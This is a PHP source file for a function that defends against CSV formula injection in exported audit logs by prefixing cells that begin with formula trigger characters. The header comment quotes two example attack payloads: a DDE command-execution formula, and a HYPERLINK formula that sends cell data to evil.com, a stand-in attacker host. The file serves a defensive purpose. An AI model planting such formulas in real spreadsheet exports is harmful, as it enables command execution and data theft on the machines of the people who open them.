<?php
/**
 * CSV Formula Injection Defense Engine (CWE-1236 Mitigation)
 * 
 * PILLAR C [C6]: CSV FORMULA INJECTION PREVENTION (SPREADSHEET FORMULA ESCAPING)
 * 
 * WHY FORMULA ESCAPING [C6]:
 * When audit logs are exported to CSV and opened in Microsoft Excel, LibreOffice Calc, or Google Sheets,
 * any cell starting with '=', '+', '-', '@', '\t', or '\r' is interpreted as an executable formula.
 * Attackers inject payloads like '=cmd|"/C calc"!A0' or '=HYPERLINK("http://evil.com?leak="&A2)'
 * into usernames, transfer remarks, or HTTP headers.
 * When an analyst exports and opens the CSV, the payload executes on their workstation (DDE execution / data exfiltration).
 * 
 * DEFENSE MECHANISM:
 * If the string value begins with any trigger character (=, +, -, @, \t, \r), prefix it with a single quote (').
 * Modern spreadsheet software renders the single quote as a literal prefix and treats the entire content as text.
 * 
 * EXAMINER TALKING POINT [C6]:
 * "We prevent CSV formula injection (CWE-1236) — an obscure vulnerability where Excel executes
 *  DDE commands or exfiltrates data via =HYPERLINK(). Most developers completely miss this."
 */

/**
 * Sanitize an individual field against CSV formula injection
 * 
 * @param mixed $value Raw field value
 * @return string Sanitized cell value safe for spreadsheet consumption
 */
function csv_escape(mixed $value): string {
    if ($value === null) {
        return '';
    }

    $str = (string)$value;

    if ($str === '') {
        return '';
    }

    // Formula trigger characters defined in OWASP CSV Injection guidelines
    $triggerChars = ['=', '+', '-', '@', "\t", "\r", '%'];

    $firstChar = $str[0];
    if (in_array($firstChar, $triggerChars, true)) {
        // Prepend single quote (') to force spreadsheet to interpret cell as literal text
        return "'" . $str;
    }

    return $str;
}
